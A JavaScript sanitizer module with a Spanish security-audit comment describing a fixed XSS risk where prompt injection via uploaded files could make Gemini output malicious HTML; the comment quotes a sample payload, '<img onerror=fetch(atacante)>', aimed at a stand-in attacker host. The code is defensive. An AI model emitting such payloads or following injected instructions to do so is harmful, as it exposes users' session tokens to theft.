import DOMPurify from 'dompurify';

/**
 * middleware/sanitize.js
 *
 * ⚠️ AUDITORÍA DE SEGURIDAD — vulnerabilidad XSS corregida.
 *
 * El HTML que devuelve Gemini (routes/proxy.js del backend) se construye a
 * partir de datos que el usuario controla: texto libre de contexto, y
 * contenido de los archivos Excel/PDF que sube. Un actor malicioso podría
 * intentar prompt injection para que el modelo reproduzca HTML/JS malicioso
 * en su respuesta (ej. <img onerror=fetch(atacante)>), que de renderizarse
 * sin sanitizar ejecutaría en el navegador de la víctima con acceso a su
 * token de sesión (sessionStorage).
 *
 * Este módulo es el ÚNICO punto autorizado para insertar HTML de la IA en
 * el DOM. Ningún componente debe usar dangerouslySetInnerHTML directamente
 * con la respuesta de la IA sin pasar antes por aquí (principio OWASP:
 * sanitizar lo más cerca posible del "sink").
 *
 * Solo se permiten etiquetas de formato — nada de scripts, iframes,
 * atributos de evento (onclick, onerror...) ni enlaces con javascript:.
 */

const ALLOWED_TAGS = ['h3', 'h4', 'p', 'ul', 'ol', 'li', 'strong', 'em', 'b', 'i', 'br', 'span', 'div'];
const ALLOWED_ATTR = ['class'];

export function sanitizeAiHtml(rawHtml) {
  if (typeof rawHtml !== 'string') return '';
  return DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    ALLOW_DATA_ATTR: false,
    // Elimina cualquier atributo tipo on* (onerror, onclick...) aunque no
    // esté en ALLOWED_ATTR — DOMPurify ya lo hace por defecto, pero lo
    // dejamos explícito para que la intención quede documentada.
    FORBID_ATTR: ['style', 'onerror', 'onload', 'onclick', 'onmouseover'],
    FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form', 'input', 'style']
  });
}
